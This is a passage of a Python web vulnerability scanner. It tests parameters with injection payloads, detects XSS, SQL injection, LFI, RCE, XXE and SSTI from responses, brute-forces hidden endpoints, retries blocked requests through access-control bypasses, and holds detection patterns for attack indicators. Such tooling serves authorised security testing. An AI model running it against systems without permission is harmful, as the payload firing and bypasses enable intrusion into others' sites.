                    print(f"         Type: {vuln_type.upper()}")
                    print(f"         Payload: {payload[:50]}{'...' if len(payload) > 50 else ''}")
                    print(f"         Status: {response.status_code}, Length: {len(response.content)}")
                    print(f"         Method: {endpoint.get('method', 'GET')}")
                    print(f"         📁 Saved to: {self.vuln_logger.get_output_dir()}")

                return True

            elif self.verbose:
                bypass_info = f" + {bypass['type']}" if bypass else ""
                print(f"      ⚪ {payload[:30]}{'...' if len(payload) > 30 else ''}{bypass_info} → {response.status_code}")

            return False

        except Exception as e:
            logger.error(f"Unexpected error in test_single_payload: {e}", exc_info=True)
            self.performance_monitor.increment_errors()
            if self.verbose:
                print(f"      ❌ Error testing payload: {e}")
            return False

        finally:
            # ✅ CLEANUP: Chiudi response object per evitare memory leak
            if response is not None:
                try:
                    response.close()
                except:
                    pass
            
    def analyze_response_for_vulnerability(self, response, payload, vuln_type, bypass,
                                          baseline_response=None, response_time=0):
        """
        Enhanced response analysis with intelligent verification and false positive reduction.

        Uses VulnerabilityVerifier for accurate detection with:
        - Type-specific verification (XSS, SQLi, LFI, RCE, SSTI, XXE)
        - Pattern learning from successful detections
        - Evidence-based confidence scoring
        - False positive prevention
        """
        status_code = response.status_code
        response_text = response.text if response.text else ""
        response_text_lower = response_text.lower()
        payload_lower = payload.lower()

        # Controllo dimensione minima risposta (evita risposte vuote o troppo piccole)
        if len(response_text) < 50:
            return False

        # ========== USE INTELLIGENT VERIFIER IF AVAILABLE ==========
        if self.vuln_verifier:
            result = self.vuln_verifier.verify(
                vuln_type=vuln_type,
                payload=payload,
                response_text=response_text,
                response_code=status_code,
                baseline_response=baseline_response,
                response_time=response_time,
                target=self.target_url
            )

            if result.is_vulnerable and result.confidence >= 50:
                # Log evidence for debugging
                if self.verbose:
                    print(f"      ✓ Verified by VulnerabilityVerifier (confidence: {result.confidence}%)")
                    for ev in result.evidence[:3]:  # Show first 3 evidence items
                        print(f"        → {ev}")
                return True
            elif result.confidence > 0 and result.confidence < 50:
                # Low confidence - log but don't report
                if self.verbose:
                    print(f"      ⚠ Low confidence ({result.confidence}%) - not reporting")
                return False
            # If verifier says not vulnerable, still check with legacy detection
            # in case verifier missed something (defense in depth)

        # ========== LEGACY DETECTION (fallback) ==========
        # First check: is payload even in response?
        payload_in_response = payload_lower in response_text_lower or payload in response_text

        if not payload_in_response:
            # Special case for blind vulnerabilities
            if vuln_type in ['sqli', 'xxe', 'ssti'] and status_code in [500, 503]:
                # Server error might indicate vulnerability
                # Ma verifica che non sia un errore generico (falso positivo)
                generic_errors = ['404', '403', 'not found', 'forbidden', 'unauthorized']
                if any(err in response_text_lower for err in generic_errors):
                    return False
                # Don't auto-confirm blind vulns without verifier
                if self.vuln_verifier:
                    return False  # Verifier already checked
                return True
            return False

        # Se il payload è nella risposta, verifica che non sia in un contesto "safe"
        # (commenti HTML, JavaScript, codice escaped, etc.)
        if self._is_payload_in_safe_context(response_text, payload):
            return False

        # If verifier is available and didn't confirm, don't use legacy detection
        # This prevents false positives
        if self.vuln_verifier:
            return False

        # ========== LEGACY VULNERABILITY-SPECIFIC DETECTION ==========
        # Only used if verifier is not available
        if vuln_type == 'xss':
            # Controlli più stringenti per XSS per ridurre falsi positivi

            # 1. Verifica se i pattern pericolosi sono preservati (non escaped)
            dangerous_patterns = [
                (r'<script[^>]*>', r'&lt;script'),
                (r'javascript:', r'javascript&#58;|javascript%3A'),
                (r'on\w+\s*=', r'on\w+\s*&#61;'),
                (r'<img[^>]*>', r'&lt;img'),
                (r'<svg[^>]*>', r'&lt;svg'),
                (r'<iframe[^>]*>', r'&lt;iframe'),
                (r'<object[^>]*>', r'&lt;object'),
                (r'<embed[^>]*>', r'&lt;embed'),
            ]

            for pattern, escaped_pattern in dangerous_patterns:
                if re.search(pattern, payload, re.I):
                    # Check if pattern exists unescaped in response
                    matches = re.finditer(pattern, response_text, re.I)

                    for match in matches:
                        # Verifica che il match sia effettivamente dal nostro payload
                        # e non da altri script legittimi nella pagina
                        context_start = max(0, match.start() - 100)
                        context_end = min(len(response_text), match.end() + 100)
                        context = response_text[context_start:context_end]

                        # Se il pattern matched contiene parti del nostro payload
                        # e non è in un commento, CDATA, o escaped
                        if not re.search(r'<!--.*?' + pattern + r'.*?-->', context, re.I | re.S):
                            if not re.search(r'<!\[CDATA\[.*?' + pattern + r'.*?\]\]>', context, re.I | re.S):
                                # Verifica che non sia escaped
                                if not re.search(escaped_pattern, context, re.I):
                                    # Controllo finale: verifica che il payload completo o una sua parte
                                    # significativa sia nel contesto
                                    if len(payload) > 10:
                                        # Per payload lunghi, cerca una sottostringa significativa
                                        payload_part = payload[:min(20, len(payload))]
                                        if payload_part in context or payload_part.lower() in context.lower():
                                            return True
                                    else:
                                        return True
        
        elif vuln_type == 'sqli':
            # Enhanced SQL error detection con riduzione falsi positivi
            # ⚡ USA REGEX PRECOMPILATE
            error_found = False
            for pattern in self.sqli_patterns:
                match = pattern.search(response_text)
                if match:
                    error_found = True
                    # Verifica che l'errore sia correlato al nostro payload
                    # Estrai il contesto attorno all'errore
                    context_start = max(0, match.start() - 200)
                    context_end = min(len(response_text), match.end() + 200)
                    error_context = response_text[context_start:context_end]

                    # Verifica che parti del payload siano vicine all'errore SQL
                    # o che l'errore menzioni caratteri SQL injection tipici
                    sql_chars = ["'", '"', '--', '/*', '*/', 'OR', 'AND', 'UNION', 'SELECT']
                    payload_upper = payload.upper()

                    # Se il payload contiene caratteri SQL tipici e l'errore è vicino
                    if any(char in payload_upper for char in ['OR', 'AND', 'UNION', 'SELECT', "'", '"']):
                        return True

                    # Se troviamo parti del payload nel contesto dell'errore
                    if len(payload) > 5:
                        payload_part = payload[:min(15, len(payload))]
                        if payload_part in error_context or payload_part.lower() in error_context.lower():
                            return True

            # Se abbiamo trovato un errore SQL generico ma non correlato al payload
            # consideriamolo comunque ma con bassa confidenza
            # (verrà gestito nel chiamante tramite confidence score)
            if error_found:
                return True
        
        elif vuln_type == 'lfi':
            # Enhanced LFI detection
            # ⚡ USA REGEX PRECOMPILATE
            for pattern in self.lfi_patterns:
                if pattern.search(response.text):
                    return True

        elif vuln_type == 'rce':
            # Enhanced RCE detection
            # ⚡ USA REGEX PRECOMPILATE
            for pattern in self.rce_patterns:
                if pattern.search(response.text):
                    return True
        
        elif vuln_type == 'xxe':
            # XXE specific indicators
            xxe_indicators = [
                r'<!DOCTYPE',
                r'<!ENTITY',
                r'SYSTEM\s+"file:',
                r'java\.io\.FileNotFoundException',
                r'org\.xml\.sax\.SAXParseException',
                r'expect:\/\/',
                r'jar:file:',
                r'gopher:\/\/'
            ]
            
            for indicator in xxe_indicators:
                if re.search(indicator, response.text, re.I):
                    return True
        
        elif vuln_type == 'ssti':
            # Template injection indicators
            # Check if mathematical operations were evaluated
            if '49' in response.text and '7*7' in payload:  # 7*7=49
                return True
            
            template_errors = [
                r'TemplateSyntaxError',
                r'jinja2\.exceptions',
                r'Smarty\s+Error',
                r'DotLiquid\s+Error',
                r'freemarker\.template',
                r'velocity\.exception'
            ]
            
            for error in template_errors:
                if re.search(error, response.text, re.I):
                    return True
        
        # If using bypass and response is different from expected blocked response
        if bypass and status_code not in [403, 406, 418, 429]:
            # Additional validation for bypass success
            if len(response.content) > 100:  # Not just an error page
                return True
        
        return False

    def _is_payload_in_safe_context(self, response_text, payload):
        """
        Verifica se il payload è in un contesto "safe" che non rappresenta una vulnerabilità.

        Riduce i falsi positivi escludendo:
        - Payload in commenti HTML (<!-- payload -->)
        - Payload in commenti JavaScript (// payload o /* payload */)
        - Payload escaped in HTML (&lt;script&gt; invece di <script>)
        - Payload in attributi data- o in JSON escaped
        - Payload in stringhe JavaScript tra virgolette con escape

        Args:
            response_text: Testo completo della risposta
            payload: Payload da verificare

        Returns:
            True se il payload è in un contesto safe (falso positivo), False altrimenti
        """
        # Verifica se il payload è in un commento HTML
        # Pattern: <!-- ... payload ... -->
        html_comment_pattern = r'<!--[\s\S]*?' + re.escape(payload) + r'[\s\S]*?-->'
        if re.search(html_comment_pattern, response_text, re.I):
            return True

        # Verifica se il payload è in un commento JavaScript
        # Pattern: // ... payload ... (fino a fine riga)
        js_line_comment_pattern = r'//.*?' + re.escape(payload)
        if re.search(js_line_comment_pattern, response_text, re.I):
            return True

        # Pattern: /* ... payload ... */
        js_block_comment_pattern = r'/\*[\s\S]*?' + re.escape(payload) + r'[\s\S]*?\*/'
        if re.search(js_block_comment_pattern, response_text, re.I | re.S):
            return True

        # Verifica se il payload è escaped in HTML
        # Es: <script> diventa &lt;script&gt;
        escaped_payload = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        if escaped_payload in response_text and escaped_payload != payload:
            # Se troviamo solo la versione escaped, è safe
            if payload not in response_text:
                return True

        # Verifica se il payload è in un attributo data- o simile (spesso usato per storage)
        data_attr_pattern = r'data-[a-zA-Z0-9\-]*\s*=\s*["\']' + re.escape(payload) + r'["\']'
        if re.search(data_attr_pattern, response_text, re.I):
            # Non è necessariamente safe, ma ha bassa priorità
            # Controlliamo se è accessibile via DOM
            pass  # Lasciamo passare per ulteriori controlli

        # Verifica se il payload è in JSON escaped
        # Es: {"test": "<script>alert(1)</script>"} diventa {"test": "\u003cscript\u003e..."}
        json_escaped_patterns = [
            r'\\u003c',  # <
            r'\\u003e',  # >
            r'\\u0022',  # "
            r'\\u0027',  # '
        ]
        if any(pattern in response_text for pattern in json_escaped_patterns):
            # Potrebbe essere JSON escaped, verifichiamo più nel dettaglio
            if payload.replace('<', r'\u003c').replace('>', r'\u003e') in response_text:
                return True

        # Verifica se il payload è in una stringa JavaScript tra virgolette con proper escaping
        # Es: var x = "<script>alert(1)<\/script>";
        js_escaped_pattern = re.escape(payload).replace(r'\<', r'\\<').replace(r'\/', r'\\/')
        js_string_pattern = r'["\']' + js_escaped_pattern + r'["\']'
        if re.search(js_string_pattern, response_text, re.I):
            # Verifica se c'è escape dello slash in chiusura tag
            if r'<\/' in response_text or r'<\\/' in response_text:
                return True

        return False

    def discover_hidden_endpoints(self, max_paths=1000):
        """Smart endpoint discovery using technology-specific wordlists"""
        print("  🔍 Smart Endpoint Discovery...")
        if self.verbose:
            print(f"  📊 Already visited: {len(self.visited_urls)} URLs")
        logger.info("Starting smart endpoint discovery with wordlists")
        
        # Get appropriate wordlists based on detected tech
        wordlists = self.get_discovery_wordlists()
        discovered_count = 0
        tested_paths = set()
        
        # Collect all paths to test
        all_paths = []
        for wordlist in wordlists:
            if os.path.exists(wordlist['path']):
                try:
                    with open(wordlist['path'], 'r', encoding='utf-8', errors='ignore') as f:
                        paths = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                        # Add technology context to each path
                        for path in paths:
                            if path not in tested_paths:
                                all_paths.append((path, wordlist['technology']))
                                tested_paths.add(path)
                                if len(all_paths) >= max_paths:
                                    break
                    logger.info(f"Loaded {len(paths)} paths from {wordlist['technology']} wordlist")
                except Exception as e:
                    logger.error(f"Error reading wordlist {wordlist['path']}: {e}")
            
            if len(all_paths) >= max_paths:
                break
        
        logger.info(f"Testing {len(all_paths)} unique paths")
        
        # Thread pool for concurrent discovery
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            # Submit all tasks
            future_to_path = {
                executor.submit(self.check_endpoint, path): (path, tech) 
                for path, tech in all_paths
            }
            
            # Process results as they complete
            for future in concurrent.futures.as_completed(future_to_path):
                path, tech = future_to_path[future]
                try:
                    result = future.result()
                    if result:
                        discovered_count += 1
                except Exception as e:
                    logger.error(f"Error checking {path}: {e}")
        
        logger.info(f"Discovered {discovered_count} new endpoints")
        if self.verbose:
            print(f"  📊 Queue size after discovery: {self.url_queue.qsize()} URLs to process")
    
    def get_discovery_wordlists(self):
        """Select wordlists based on detected technologies"""
        wordlists = []
        added_sources = set()
        
        # Always include generic wordlists
        generic_lists = self.discovery_mapper.get_wordlists('generic')
        for wl in generic_lists:
            if wl['path'] not in added_sources:
                wordlists.append(wl)
                added_sources.add(wl['path'])
        
        # Add CMS-specific wordlists
        if self.results['technologies'].get('cms'):
            cms = self.results['technologies']['cms'].lower()
            cms_lists = self.discovery_mapper.get_wordlists(cms)
            for wl in cms_lists:
                if wl['path'] not in added_sources:
                    wordlists.append(wl)
                    added_sources.add(wl['path'])
        
        # Add language-specific wordlists
        if self.results['technologies'].get('language'):
            lang = self.results['technologies']['language'].lower()
            lang_lists = self.discovery_mapper.get_wordlists(lang)
            for wl in lang_lists:
                if wl['path'] not in added_sources:
                    wordlists.append(wl)
                    added_sources.add(wl['path'])
        
        logger.info(f"Selected {len(wordlists)} wordlists for discovery")
        return wordlists
    
    def check_endpoint(self, path):
        """Check if an endpoint exists, with bypass support"""
        # Clean path
        if not path.startswith('/'):
            path = '/' + path
        
        url = self.target_url + path
        
        # Skip if already visited
        if self.normalize_url(url) in self.visited_urls:
            return None
        
        try:
            # Rotate user agent
            self._rotate_user_agent()
            
            # Use HEAD first (faster)
            response = self.session.head(url, timeout=5, allow_redirects=False, verify=False)
            status = response.status_code
            
            # If blocked and we have bypasses, try them
            if status in [401, 403] and self.bypass_manager and self.bypass_manager.validated_bypasses:
                for bypass in self.bypass_manager.validated_bypasses:
                    bypass_params = self.bypass_manager.apply_bypass_to_request(url, bypass)
                    if bypass_params:
                        try:
                            bypass_response = self.session.head(
                                bypass_params['url'],
                                headers=bypass_params.get('headers'),
                                timeout=5,
                                allow_redirects=False,
                                verify=False
                            )
                            if bypass_response.status_code not in [401, 403]:
                                status = bypass_response.status_code
                                response = bypass_response
                                if self.verbose:
                                    print(f"🔧 Bypass {bypass['type']} successful for {path}: {status}")
                                break
                        except:
                            continue
            
            # If interesting status, try GET for more info
            if status in [200, 201, 301, 302, 401, 403, 405]:
                if status == 405:  # Method not allowed, try GET
                    response = self.session.get(url, timeout=5, allow_redirects=False, verify=False)
                    status = response.status_code
                
                logger.info(f"Found endpoint: {path} (Status: {status})")
                
                result = {
                    'url': url,
                    'path': path,
                    'status': status,
                    'content_type': response.headers.get('Content-Type', ''),
                    'size': response.headers.get('Content-Length', 0)
                }
                
                # Add to interesting files based on status
                self.results['interesting_files'].append(result)
                
                # Se è un redirect, prova a seguirlo per vedere se porta a una pagina valida
                if status in [301, 302]:
                    try:
                        if self.verbose:
                            print(f"  ↪️ Following redirect from {path}...")
                            # AGGIUNGI: mostra l'header Location
                            location = response.headers.get('Location', 'No Location header')
                            print(f"    📍 Location header: {location}")
                        
                        # Segui il redirect
                        redirect_response = self.session.get(url, timeout=10, allow_redirects=True, verify=False)
                        final_url = redirect_response.url
                        final_status = redirect_response.status_code
                        
                        # AGGIUNGI: mostra sempre dove porta (non solo se status 200)
                        if self.verbose:
                            print(f"    → Final destination: {final_url} (Status: {final_status})")
                        
                        # If blocked at destination and we have bypasses, try them
                        if final_status in [401, 403] and self.bypass_manager and self.bypass_manager.validated_bypasses:
                            if self.verbose:
                                print(f"    🚫 Destination blocked ({final_status}), trying bypasses...")
                            
                            for bypass in self.bypass_manager.validated_bypasses:
                                bypass_params = self.bypass_manager.apply_bypass_to_request(final_url, bypass)
                                if bypass_params:
                                    try:
                                        bypass_redirect_response = self.session.get(
                                            bypass_params['url'],
                                            headers=bypass_params.get('headers'),
                                            timeout=10,
                                            verify=False,
                                            allow_redirects=True
                                        )
                                        
                                        if bypass_redirect_response.status_code not in [401, 403]:
                                            if self.verbose:
                                                print(f"      🔧 Bypass {bypass['type']} successful! Status: {bypass_redirect_response.status_code}")
                                            final_status = bypass_redirect_response.status_code
                                            final_url = bypass_redirect_response.url
                                            redirect_response = bypass_redirect_response
                                            break
                                        elif self.verbose:
                                            print(f"      ❌ Still blocked with {bypass['type']}: {bypass_redirect_response.status_code}")
                                    except Exception as e:
                                        if self.verbose:
                                            print(f"      ❌ Bypass error: {e}")
                                        continue
                        
                        if final_status == 200:
                            logger.info(f"Redirect {path} → {final_url} (Status: {final_status})")
                            
                            # Aggiungi la destinazione finale alla coda se non è già stata visitata
                            if self.normalize_url(final_url) not in self.visited_urls:
                                self.url_queue.put((final_url, 0))
                                
                                if self.verbose:
                                    print(f"    ✅ Added redirect destination to crawl queue: {final_url}")
                            else:
                                # AGGIUNGI: mostra se già visitato
                                if self.verbose:
                                    print(f"    ⚠️ Already visited: {final_url}")
                            
                            # Aggiorna il risultato con info sul redirect
                            result['redirect_to'] = final_url
                            result['redirect_status'] = final_status
                        else:
                            # AGGIUNGI: mostra perché non viene aggiunto
                            if self.verbose:
                                print(f"    ❌ Not added to queue (status: {final_status})")
                    except Exception as e:
                        logger.debug(f"Error following redirect from {path}: {e}")
                        # AGGIUNGI: mostra errori se verbose
                        if self.verbose:
                            print(f"    ❌ Error: {e}")
                
                return result
                
        except requests.exceptions.Timeout:
            logger.debug(f"Timeout checking {path}")
        except requests.exceptions.ConnectionError:
            logger.debug(f"Connection error checking {path}")
        except Exception as e:
            logger.debug(f"Error checking {path}: {e}")
        
        return None
    
    def calculate_priority(self, endpoint):
        """Calculate priority score for an endpoint"""
        score = 0
        
        # High value endpoints
        high_value_paths = ['/admin', '/api', '/upload', '/login', '/register', 
                           '/password', '/account', '/profile', '/payment']
        for path in high_value_paths:
            if path in endpoint['url'].lower():
                score += 10
        
        # Number of parameters
        score += len(endpoint.get('parameters', [])) * 2
        
        # High confidence vulnerabilities
        for param in endpoint.get('parameters', []):
            for vuln in param.get('predicted_vulns', []):
                if vuln['confidence'] >= 85:
                    score += 8
                elif vuln['confidence'] >= 60:
                    score += 5
                else:
                    score += 2
        
        # Form endpoints
        if endpoint.get('form'):
            score += 3
        
        # File upload
        for param in endpoint.get('parameters', []):
            if param.get('type') == 'file':
                score += 10
        
        return score
    
    def run(self, discovery_limit=1000, skip_discovery=False):
        """Run the crawler"""
        logger.info(f"Starting crawl of {self.target_url}")
        
        # Resolve initial redirects
        if not self.resolve_initial_redirects():
            logger.error("Failed to reach target URL")
            return self.results
        
        # Start with resolved target URL
        self.url_queue.put((self.target_url, 0))
        
        # Do initial crawl to detect technologies
        initial_url, _ = self.url_queue.get()
        self.crawl_page(initial_url, 0)
        
        # Smart endpoint discovery based on detected technologies
        if not skip_discovery and self.results['technologies']:
            self.discover_hidden_endpoints(max_paths=discovery_limit)
        elif not skip_discovery:
            # If no tech detected yet, do basic discovery
            logger.info("No technologies detected yet, using basic discovery")
            basic_endpoints = ['/robots.txt', '/sitemap.xml', '/.well-known/', '/api/', '/admin/']
            for endpoint in basic_endpoints:
                self.url_queue.put((self.target_url + endpoint, 0))
        
        # Continue crawling
        while not self.url_queue.empty() and len(self.visited_urls) < self.max_pages:
            url, depth = self.url_queue.get()
            if self.verbose:
                print(f"\n📄 Processing from queue: {url} (depth: {depth})")
            self.crawl_page(url, depth)
            
            # Small delay between requests
            time.sleep(random.uniform(0.5, 1.5))
        
        # Process results
        self.results['endpoints'] = self.endpoints
        
        # Calculate priorities
        for endpoint in self.results['endpoints']:
            endpoint['priority'] = self.calculate_priority(endpoint)
        
        # Sort by priority
        self.results['endpoints'].sort(key=lambda x: x['priority'], reverse=True)
        
        # Remove duplicates
        self.results['javascript_files'] = list(set(self.results['javascript_files']))
        self.results['api_endpoints'] = list(set(self.results['api_endpoints']))
        self.results['emails'] = list(set(self.results['emails']))
        
        logger.info(f"Crawl complete. Found {len(self.results['endpoints'])} endpoints")
        
        return self.results
    
    def export_results(self, filename='attack_surface.json'):
        """Export results to JSON file in results directory"""
        # Save in results directory
        output_path = os.path.join(self.results_dir, filename)
        with open(output_path, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        logger.info(f"Results exported to {output_path}")
        return output_path


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Smart Vulnerability Crawler with Bypass Integration and Behavioral Analysis')
    parser.add_argument('target', help='Target URL to crawl')
    parser.add_argument('--depth', type=int, default=3, help='Maximum crawl depth (default: 3)')
    parser.add_argument('--max-pages', type=int, default=1000, help='Maximum pages to crawl (default: 1000)')
    parser.add_argument('--output', default='attack_surface.json', help='Output JSON file')
    parser.add_argument('--wordlist-base', required=True,
                        help='Base path for wordlists (REQUIRED). Example: /usr/share/wordlists or ~/wordlists')
    parser.add_argument('--discovery-limit', type=int, default=1000, help='Max paths to test')
    parser.add_argument('--skip-discovery', action='store_true', help='Skip wordlist discovery')
    parser.add_argument('--bypass-file', help='JSON file with bypasses')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--debug', action='store_true',
                        help='Enable debug mode: logs all I/O data, headers, and data flows to debug_*.json')

    # Authentication options
    auth_group = parser.add_argument_group('authentication')
    auth_group.add_argument('--auth-type', choices=['basic', 'bearer', 'cookie', 'form', 'custom_header'],
                           help='Authentication type')
    auth_group.add_argument('--auth-username', help='Username for authentication')
    auth_group.add_argument('--auth-password', help='Password for authentication')
    auth_group.add_argument('--auth-token', help='Bearer token')
    auth_group.add_argument('--auth-login-url', help='Login URL for form auth')
    auth_group.add_argument('--auth-cookies', help='Cookies in format: name1=value1;name2=value2')
    auth_group.add_argument('--auth-headers', help='Headers in format: Header1:Value1;Header2:Value2')
    auth_group.add_argument('--auth-config', help='JSON file with auth configuration')
    
    args = parser.parse_args()

    # ========== VALIDATE WORDLIST-BASE (REQUIRED) ==========
    wordlist_base = os.path.expanduser(args.wordlist_base)  # Expand ~ if used
    if not os.path.isdir(wordlist_base):
        print(f"\n  ✗ ERROR: Wordlist base path does not exist: {wordlist_base}")
        print(f"    Please specify a valid path with --wordlist-base")
        print(f"    Example: --wordlist-base /usr/share/wordlists")
        print(f"             --wordlist-base ~/SecLists")
        sys.exit(1)

    # Check for expected subdirectories
    expected_dirs = ['SecLists', 'PayloadsAllTheThings', 'fuzzdb']
    found_dirs = [d for d in expected_dirs if os.path.isdir(os.path.join(wordlist_base, d))]

    if not found_dirs:
        print(f"\n  ⚠ WARNING: No standard wordlist directories found in {wordlist_base}")
        print(f"    Expected one of: {', '.join(expected_dirs)}")
        print(f"    Detection capabilities may be limited.")
        print(f"    Consider installing SecLists: git clone https://github.com/danielmiessler/SecLists.git")
    else:
        print(f"\n  ✓ Wordlist base: {wordlist_base}")
        print(f"    Found: {', '.join(found_dirs)}")

    # Build auth configuration
    # Priority: command line args > JSON file > defaults
    auth_config = None

    # First: load from JSON file if specified
    if args.auth_config:
        try:
            with open(args.auth_config, 'r') as f:
                auth_config = json.load(f)
            print(f"  ✓ Loaded auth config from {args.auth_config}")
        except Exception as e:
            print(f"  ✗ Error loading auth config: {e}")
            sys.exit(1)

    # Second: merge/override with command line options
    if args.auth_type or args.auth_username or args.auth_token or args.auth_cookies:
        if auth_config is None:
            auth_config = {}

        # Command line args take precedence over JSON file
        if args.auth_type:
            auth_config['type'] = args.auth_type
        if args.auth_username:
            auth_config['username'] = args.auth_username
        if args.auth_password:
            auth_config['password'] = args.auth_password
        if args.auth_token:
            auth_config['token'] = args.auth_token
        if args.auth_login_url:
            auth_config['login_url'] = args.auth_login_url
        if args.auth_cookies:
            cookies = {}
            for cookie in args.auth_cookies.split(';'):
                if '=' in cookie:
                    name, value = cookie.split('=', 1)
                    cookies[name.strip()] = value.strip()
            auth_config['cookies'] = cookies
        if args.auth_headers:
            headers = {}
            for header in args.auth_headers.split(';'):
                if ':' in header:
                    name, value = header.split(':', 1)
                    headers[name.strip()] = value.strip()
            auth_config['headers'] = headers

    # Validate auth_config has a type
    if auth_config and 'type' not in auth_config:
        print("  ✗ Error: auth config must have a 'type' field")
        print("    Valid types: basic, bearer, cookie, form, custom_header, oauth2")
        sys.exit(1)
    
    # Initialize bypass manager
    bypass_manager = None
    if args.bypass_file:
        bypass_manager = BypassManager(args.bypass_file)
    
    # Create crawler instance with auth and debug mode
    crawler = SmartCrawler(
        args.target,
        max_depth=args.depth,
        max_pages=args.max_pages,
        verbose=args.verbose,
        auth_config=auth_config,
        debug_mode=args.debug
    )
    
    # Set bypass manager
    if bypass_manager:
        crawler.set_bypass_manager(bypass_manager)

    # Set wordlist base path (REQUIRED - already validated above)
    crawler.wordlist_mapper.base_paths = {
        'fuzzdb': f"{wordlist_base}/fuzzdb",
        'payloads': f"{wordlist_base}/PayloadsAllTheThings",
        'seclists': f"{wordlist_base}/SecLists"
    }
    crawler.discovery_mapper.base_paths = {
        'fuzzdb': f"{wordlist_base}/fuzzdb",
        'payloads': f"{wordlist_base}/PayloadsAllTheThings",
        'seclists': f"{wordlist_base}/SecLists"
    }
    
    # Run crawler
    results = crawler.run(discovery_limit=args.discovery_limit, skip_discovery=args.skip_discovery)

    # Export results (returns full path in results directory)
    output_path = crawler.export_results(args.output)
    
    # Print summary
    print("\n" + "="*60)
    print("CRAWL SUMMARY")
    print("="*60)
    print(f"Target: {args.target}")
    print(f"Pages crawled: {len(crawler.visited_urls)}")
    print(f"Endpoints found: {len(results['endpoints'])}")
    print(f"Forms found: {len(results['forms'])}")
    print(f"JavaScript files: {len(results['javascript_files'])}")
    print(f"API endpoints: {len(results['api_endpoints'])}")
    print(f"Interesting files: {len(results['interesting_files'])}")
    
    # Behavioral analysis summary
    if results['behavioral_analysis_results']:
        print(f"\n🧪 BEHAVIORAL ANALYSIS: {len(results['behavioral_analysis_results'])} parameters analyzed")
        
        # Count detected behaviors
        behaviors_detected = defaultdict(int)
        for analysis in results['behavioral_analysis_results']:
            for context, result in analysis['results'].items():
                if result.get('detected'):
                    behaviors_detected[context] += 1
        
        if behaviors_detected:
            print("  Behaviors detected:")
            for behavior, count in behaviors_detected.items():
                print(f"    - {behavior}: {count} parameters")
    
    # Vulnerability test results
    if results['vulnerability_test_results']:
        print(f"\n🚨 VULNERABILITIES DETECTED: {len(results['vulnerability_test_results'])}")
        
        # Group by vulnerability type
        vuln_by_type = defaultdict(list)
        for result in results['vulnerability_test_results']:
            vuln_by_type[result['vulnerability_type']].append(result)
        
        for vuln_type, vuln_results in vuln_by_type.items():
            print(f"\n{vuln_type.upper()} ({len(vuln_results)} found):")
            for result in vuln_results[:3]:  # Show first 3 of each type
                bypass_info = f" (via {result['bypass_used']})" if result['bypass_used'] else ""
                print(f"  📍 {result['endpoint']} → {result['parameter']}{bypass_info}")
                print(f"     Payload: {result['payload'][:50]}{'...' if len(result['payload']) > 50 else ''}")
    
    # Technology summary
    print("\nDETECTED TECHNOLOGIES:")
    for key, value in results['technologies'].items():
        if value and key not in ['headers', 'cookies', 'javascript_libs', 'infrastructure', 'stack']:
            print(f"  {key.capitalize()}: {value}")
    if results['technologies'].get('javascript_libs'):
        print(f"  JS Libraries: {', '.join(results['technologies']['javascript_libs'])}")
    
    # Infrastructure from bypass file
    if results['technologies'].get('stack'):
        print("\nINFRASTRUCTURE STACK (from bypass file):")
        stack = results['technologies']['stack']
        for component, value in stack.items():
            if value:
                print(f"  {component.capitalize()}: {value}")
    
    # Bypass usage summary
    if bypass_manager and bypass_manager.validated_bypasses:
        print(f"\nBYPASSES USED:")
        for bypass in bypass_manager.validated_bypasses:
            print(f"  ✅ {bypass['type']}: {bypass['description']}")
        
        # Count bypass usage in vulnerability results
        bypass_usage = defaultdict(int)
        for result in results['vulnerability_test_results']:
            if result['bypass_used']:
                bypass_usage[result['bypass_used']] += 1
        
        if bypass_usage:
            print(f"\nBYPASS EFFECTIVENESS:")
            for bypass_type, count in bypass_usage.items():
                print(f"  🔧 {bypass_type}: {count} successful tests")
    
    # Top priority endpoints
    print("\nTOP PRIORITY ENDPOINTS:")
    for endpoint in results['endpoints'][:5]:
        print(f"  [{endpoint['priority']}] {endpoint['method']} {endpoint['url']}")
        for param in endpoint.get('parameters', [])[:2]:
            if param.get('predicted_vulns'):
                vulns = ', '.join([v['type'] for v in param['predicted_vulns']])
                print(f"    └─ {param['name']}: {vulns}")
    
    # Save debug log if debug mode was enabled
    if args.debug and crawler.debug_logger:
        debug_file = crawler.debug_logger.save()
        if debug_file:
            print(f"\n🐛 DEBUG LOG saved to: {debug_file}")
            print("   Contains: all HTTP I/O, headers, auth events, data flows")
            print("   Attach this file when reporting bugs")

    print("\n" + "="*60)
    print(f"📂 All results saved to: {crawler.results_dir}")
    print(f"   - {output_path}")
    print(f"   - {crawler.vuln_logger.vuln_file}")
    if args.debug and crawler.debug_logger:
        print(f"   - {crawler.debug_logger.output_file}")
    print("="*60)


if __name__ == "__main__":
    main()